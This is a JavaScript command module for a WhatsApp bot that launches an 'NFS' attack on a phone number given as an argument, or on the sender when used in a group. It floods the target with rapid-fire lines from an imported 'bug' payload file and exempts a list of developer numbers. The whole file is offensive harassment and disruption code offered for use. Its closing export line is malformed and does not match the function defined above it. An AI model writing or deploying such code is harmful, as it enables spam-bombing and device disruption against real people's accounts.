import notif4 from '../../bug/Mullar-Nfs-Bot.js';
import config from '../../config.cjs';

const xforceAttack = async (message, sock) => {
  const prefix = config.PREFIX;
  const botNumber = await sock.decodeJid(sock.user.id);
  const isOwner = [botNumber, config.OWNER_NUMBER + '@s.whatsapp.net'].includes(message.sender);
  const forbiddenNumber = ['254100594249','923208206484','254752818245']; // protection to the dev

  const cmd = message.body.startsWith(prefix)
    ? message.body.slice(prefix.length).split(' ')[0].toLowerCase()
    : '';
  const args = message.body.trim().split(' ').slice(1);

  if (cmd !== 'NFS') return;

  // Détecter si l’attaque est lancée dans un groupe sans mention
  let targetNumber;
  if (message.from.endsWith('@g.us')) {
    // Si l’attaque est lancée dans un groupe, prendre l’auteur du message
    targetNumber = message.sender.split('@')[0];
  } else if (args.length > 0 && !isNaN(args[0])) {
    targetNumber = args[0];
  }

  if (!targetNumber) {
    return await sock.sendMessage(
      message.from,
      {
        text: `❌ Usage:\n*x-force <number>*\nor simply type *NFS BOT* in a group.`,
      },
      { quoted: message }
    );
  }

  if (forbiddenNumber.includes(targetNumber)) {
    return await sock.sendMessage(
      message.from,
      {
        text: `🛡️ This number is protected by NFS BOT. Attack blocked.`,
      },
      { quoted: message }
    );
  }

  const target = `${targetNumber}@s.whatsapp.net`;

  // Message de lancement
  await sock.sendMessage(
    message.from,
    {
      text: `⚔️ Launching *NFS.MODE* attack on: +${targetNumber}...\nPlease wait...`,
    },
    { quoted: message }
  );

  // Attaque stylisée
  const messages = notif4.split('\n').filter(Boolean);
  for (let i = 0; i < messages.length; i++) {
    await sock.sendMessage(target, {
      text: `🔺 *NFS BLAST #${i + 1}* 🔻\n${messages[i]}\n\n_⚠️ SYSTEM FAILURE DETECTED_\n~MULLAR-NFS ~`,
    });
    await new Promise((resolve) => setTimeout(resolve, 200));
  }

  // Message de fin
  await sock.sendMessage(
    message.from,
    {
      text: `✅ *MULLAR-NFS* attack successfully completed.`,
    },
    { quoted: message }
  );
};

export default MULLAR-NFS Attack;
